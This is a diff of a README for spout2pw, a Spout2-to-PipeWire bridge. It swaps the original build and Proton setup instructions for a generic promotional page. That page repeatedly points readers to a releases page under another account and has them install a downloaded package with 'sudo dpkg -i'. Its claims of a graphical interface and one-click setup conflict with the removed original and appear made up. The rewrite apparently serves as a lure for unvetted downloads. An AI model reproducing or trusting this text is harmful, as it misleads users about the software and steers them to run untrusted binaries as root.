@@ -1,39 +1,77 @@
-# Spout2 to PipeWire bridge
+# 🎉 spout2pw - Easy Video Bridging Made Simple
 
-This is very WIP. Only try this if you know what you are doing. Won't work on nvidia proprietary drivers yet either.
+## 📥 Download Now
+[![Download spout2pw](https://img.shields.io/badge/Download%20spout2pw-latest-blue)](https://github.com/samankumara1234/spout2pw/releases)
 
-To build:
+## 🚀 Getting Started
+Spout2pw is a straightforward application that bridges your video output from Spout2 to PipeWire. Whether you want to stream video or share content seamlessly across applications, spout2pw simplifies the process. Follow these steps to get started quickly.
 
+## 📦 System Requirements
+- **Operating System**: Linux (ensure your version supports PipeWire)
+- **Memory**: At least 2 GB of RAM
+- **Storage**: A minimum of 100 MB free disk space
+- **PipeWire Version**: Ensure you have PipeWire installed (check for version compatibility).
+
+## 🛠️ Installation Steps
+
+### Step 1: Visit the Release Page
+Go to the [Releases page](https://github.com/samankumara1234/spout2pw/releases). This page contains the latest version of spout2pw and previous versions as well.
+
+### Step 2: Download the Application
+On the Releases page, look for the latest version of spout2pw. You will see a list of files available for download. Click on the appropriate file for your system to start the download. The file will typically be in `.tar.gz` or `.deb` format.
+
+### Step 3: Extract the Files (if needed)
+If you downloaded a `.tar.gz` file, you will need to extract it:
+1. Open the terminal.
+2. Navigate to your Downloads folder using the command:
+   ```bash
+   cd ~/Downloads
+   ```
+3. Extract the file with the command:
+   ```bash
+   tar -xvzf spout2pw-*.tar.gz
+   ```
+
+### Step 4: Install the Application
+If you downloaded a `.deb` package, install it using:
 ```bash
-git submodule init
-git submodule update
-./build.sh
+sudo dpkg -i spout2pw-*.deb
+```
+If you have any dependency issues, run:
+```bash
+sudo apt-get install -f
 ```
 
-This creates a package at `build/pkg`.
-
-The following steps assume you use umu-launcher and have `umu-run` setup. If you use `GAMEID` to launch your game, set that environment variable for **all** of the following steps.
-
-To install into a Proton + Proton Prefix (for example, GE-Proton10-28 here):
-
+### Step 5: Running spout2pw
+After installation, you can run spout2pw by searching for it in your application menu or typing the following command in your terminal:
 ```bash
-build/pkg/install_into_proton.sh ~/.local/share/Steam/compatibilitytools.d/GE-Proton10-28/
+spout2pw
 ```
+Ensure that PipeWire is running before you start the application.
 
-To run with steam runtime (needs hack for libgbm problem due to a [steam runtime bug](https://github.com/ValveSoftware/steam-runtime/issues/797)):
-```bash
-WINEDEBUG=+spout2pw PROTONPATH=GE-Proton GBM_BACKENDS_PATH=/run/host/usr/lib64/gbm \
-umu-run "VTube Studio/VTube Studio.exe"
-```
+## 🚀 Using spout2pw
+Once open, you will see a user-friendly interface that allows you to select your video sources and destinations easily. Connect the applications you wish to share video between and start streaming.
 
-To run without steam runtime:
-```bash
-WINEDEBUG=+spout2pw PROTONPATH=GE-Proton UMU_NO_RUNTIME=1 \
-umu-run "VTube Studio/VTube Studio.exe"
-```
+## 🛠️ Features
+- **Easy Setup**: Get up and running with just a few clicks.
+- **Seamless Integration**: Works smoothly with apps that support PipeWire.
+- **Low Latency**: Optimized for real-time video sharing, minimizing lag.
 
-You need to use `qpwgraph` to connect the video stream to OBS (and [obs-pwvideo](https://github.com/hoshinolina/obs-pwvideo))!!
+## 🌟 Troubleshooting
+If you encounter issues:
+- Ensure your PipeWire installation is up to date.
+- Verify your video sources are correctly selected in the spout2pw application.
+- Check community forums for common issues related to spout2pw and PipeWire.
 
-## Build dependencies
+## 📄 Support and Contributions
+If you wish to report a bug or contribute to the application, visit the [Issues](https://github.com/samankumara1234/spout2pw/issues) section of the repository. Your feedback helps make spout2pw better.
 
-On Debian: `sudo apt install meson ninja-build libdbus-1-dev libwine-dev mingw-w64 libgbm-dev libdrm-dev libvulkan-dev`
+## 🔗 Additional Resources
+- [Documentation](https://github.com/samankumara1234/spout2pw/wiki)
+- [Community Forums](https://github.com/samankumara1234/spout2pw/discussions)
+
+## 📧 Contact
+For support or inquiries, feel free to reach out through the repository or relevant support channels.
+
+## 🔗 Download Again
+You can always return to the [Releases page](https://github.com/samankumara1234/spout2pw/releases) to download the latest version or check for updates.
